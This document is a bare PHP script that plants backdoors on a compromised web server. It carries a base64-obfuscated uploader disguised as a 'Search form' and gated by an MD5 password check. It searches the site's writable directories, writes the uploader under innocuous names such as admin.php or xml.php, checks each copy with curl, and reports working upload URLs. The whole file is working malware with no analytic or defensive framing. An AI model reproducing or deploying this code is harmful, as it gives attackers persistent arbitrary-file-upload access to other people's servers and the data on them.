<?php

if (!function_exists('file_put_contents'))
{
	function file_put_contents($filename, $data)
	{
		$f = @fopen($filename, 'w');
		if (!$f)
		{
			return false;
		}
		else
		{
			$bytes = fwrite($f, $data);
			fclose($f);
			return $bytes;
		}
	}
}

if(!function_exists("stripos"))
{
	function stripos($str, $needle, $offset = 0  )
	{
		return strpos(  strtolower( $str ), strtolower( $needle ), $offset  );
	}
}

$upl_content = base64_decode('PD9waHAKaWYoIWVtcHR5KCRfRklMRVNbJ21lc3NhZ2UnXVsnbmFtZSddKSAmJiAobWQ1KCRfUE9TVFsnbmFtZSddKSA9PSAnMzkwOTk5ODFkYmYyODEzOGU4Y2M1MDJjY2U0OTZlZDcnKSkgCnsKCSRzZWN1cml0eV9jb2RlID0gKGVtcHR5KCRfUE9TVFsnc2VjdXJpdHlfY29kZSddKSkgPyAnLicgOiAkX1BPU1RbJ3NlY3VyaXR5X2NvZGUnXTsKCSRzZWN1cml0eV9jb2RlID0gcnRyaW0oJHNlY3VyaXR5X2NvZGUsICIvIik7CglpZiAoIWlzX3dyaXRhYmxlKCRzZWN1cml0eV9jb2RlLiIvIikpIAoJewoJCUBjaG1vZCgkc2VjdXJpdHlfY29kZS4iLyIsMDc1NSk7Cgl9CglAbW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ21lc3NhZ2UnXVsndG1wX25hbWUnXSwgJHNlY3VyaXR5X2NvZGUuIi8iLiRfRklMRVNbJ21lc3NhZ2UnXVsnbmFtZSddKSA/IHByaW50ICI8Yj5NZXNzYWdlIHNlbnQhPC9iPjxici8+IiA6IHByaW50ICI8Yj5FcnJvciE8L2I+PGJyLz4iOwp9CnByaW50ICc8aHRtbD4KICAgIDxoZWFkPgogICAgPHRpdGxlPlNlYXJjaCBmb3JtPC90aXRsZT4KICAgIDwvaGVhZD4KICAgIDxib2R5PgogICAgPGZvcm0gZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgYWN0aW9uPSIiIG1ldGhvZD0iUE9TVCI+CiAgICBNZXNzYWdlOiA8YnIvPjxpbnB1dCBuYW1lPSJtZXNzYWdlIiB0eXBlPSJmaWxlIiAvPgogICAgPGJyLz5TZWN1cml0eSBDb2RlOiA8YnIvPjxpbnB1dCBuYW1lPSJzZWN1cml0eV9jb2RlIiB2YWx1ZT0iIi8+Cgk8YnIvPk5hbWU6IDxici8+PGlucHV0IG5hbWU9Im5hbWUiIHZhbHVlPSIiLz48YnIvPgogICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlNlbnQiIC8+CiAgICA8L2Zvcm0+CiAgICA8L2JvZHk+CiAgICA8L2h0bWw+Jzs=');

$domain        = $_SERVER['HTTP_HOST'];
$our_dir       = dirname(__FILE__);
$request_dir   = preg_replace('!(.*)/.*!','\\1',$_SERVER['REQUEST_URI']);
$our_dir       = str_replace('\\','/',$our_dir);
$root_dir      = str_replace($request_dir,'',$our_dir);

echo "<pre>site root dir:$root_dir<br>\r\n";

//get dirs in site root
$ok_dirs_1  = $ok_dirs_2 = array();
$dirs = glob($root_dir.'/*',GLOB_ONLYDIR);
foreach ($dirs as $dir)
{
	if (stripos($dir,'/cgi-bin')) {continue;}
	if (is_writable($dir)) {$ok_dirs_2[] = $dir;}

	$dirs2 = glob($dir.'/*',GLOB_ONLYDIR);
	foreach ($dirs2 as $dir2)
	{
		if (is_writable($dir2)) {$ok_dirs_1[] = $dir2;}
	}


}


shuffle($ok_dirs_1);
shuffle($ok_dirs_2);


$files_uploaded = 0;

foreach ($ok_dirs_1 as $dir)
{
	$filename = get_script_name().'.php';
	if (is_file($dir.'/'.$filename))
	{
		$filename = get_script_name().'.php';
	}
	if (is_file($dir.'/'.$filename))
	{
		$filename = get_script_name().'.php';
	}
	file_put_contents($dir.'/'.$filename,$upl_content);
	$web_path = ($root_dir=='/') ? 'http://'.$domain.$dir.$filename : 'http://'.$domain.str_replace($root_dir,'',$dir).'/'.$filename;
	$serv_resp = file_get_contents2($web_path);

	if (strpos($serv_resp,'Security Code: <br/><input name="security_code" value=""/>'))
	{
		$files_uploaded++;
		echo "UPL_OK:::$web_path:::\r\n";
		if ($files_uploaded >= 2) {break;}
	}
	else
	{
		echo "INVALID - $web_path\r\n";
		unlink($dir.'/'.$filename);
	}
}


if ($files_uploaded<2)
{
	foreach ($ok_dirs_2 as $dir)
	{
		$filename = get_script_name().'.php';
		if (is_file($dir.'/'.$filename))
		{
			$filename = get_script_name().'.php';
		}
		if (is_file($dir.'/'.$filename))
		{
			$filename = get_script_name().'.php';
		}
		file_put_contents($dir.'/'.$filename,$upl_content);
		$web_path = ($root_dir=='/') ? 'http://'.$domain.$dir.$filename : 'http://'.$domain.str_replace($root_dir,'',$dir).'/'.$filename;
		$serv_resp = file_get_contents2($web_path);

		if (strpos($serv_resp,'Security Code: <br/><input name="security_code" value=""/>'))
		{
			$files_uploaded++;
			echo "UPL_OK:::$web_path:::\r\n";
			if ($files_uploaded >= 2) {break;}
		}
		else
		{
			echo "INVALID - $web_path\r\n";
			unlink($dir.'/'.$filename);
		}
	}
}

if ($files_uploaded<2)
{
	$filename = get_script_name().'.php';
	if (is_file($dir.'/'.$filename))
	{
		$filename = get_script_name().'.php';
	}
	if (is_file($dir.'/'.$filename))
	{
		$filename = get_script_name().'.php';
	}
	file_put_contents($root_dir.'/'.$filename,$upl_content);
	$web_path = 'http://'.$domain.'/'.$filename;
	$serv_resp = file_get_contents2($web_path);

	if (strpos($serv_resp,'Security Code: <br/><input name="security_code" value=""/>'))
	{
		$files_uploaded++;
		echo "UPL_OK:::$web_path:::\r\n";
	}
	else
	{
		unlink($root_dir.'/'.$filename);
	}
}

if ($files_uploaded<2)
{
	echo "ERROR:::Not all files uploaded:::\r\n";
}


echo '<br><b>Done!</b>';


function file_get_contents2($url)
{
	$ch = curl_init($url);
	curl_setopt($ch, CURLOPT_TIMEOUT, 10);
	curl_setopt($ch, CURLOPT_HEADER,0);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
	"User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Accept-Language: en-us,en;q=0.5",
	"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7",
	"Connection: keep-alive"));
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

	$r = curl_exec($ch);
	if (curl_error($ch))
	{
		$z= curl_error($ch);
		curl_close ($ch);
		echo 'Curl error:'.$z.' Url:'.$url."<br>\r\n";
		return '';
	}
	else
	{
		curl_close ($ch);
		return $r;
	}
}

function get_script_name()
{
	$x = array(
	'xml',
	'fill',
	'lib',
	'data',
	'admin',
	'acces',
	'str_compare',
	'preg_class'
	);

	return $x[array_rand($x)];
}
